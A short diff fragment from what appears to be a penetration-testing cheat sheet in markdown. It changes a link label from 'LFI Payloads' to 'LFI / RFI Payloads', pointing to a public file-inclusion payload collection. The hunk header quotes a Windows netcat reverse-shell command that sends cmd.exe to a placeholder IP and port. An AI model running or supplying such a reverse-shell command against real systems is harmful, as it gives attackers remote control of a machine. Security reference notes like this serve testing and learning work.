@@ -114,7 +114,7 @@ Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>
 
 ### Local File Inclusion / Remote File Inclusion (LFI / RFI)
 
-[LFI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
+[LFI / RFI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
 
 #### LFI
 
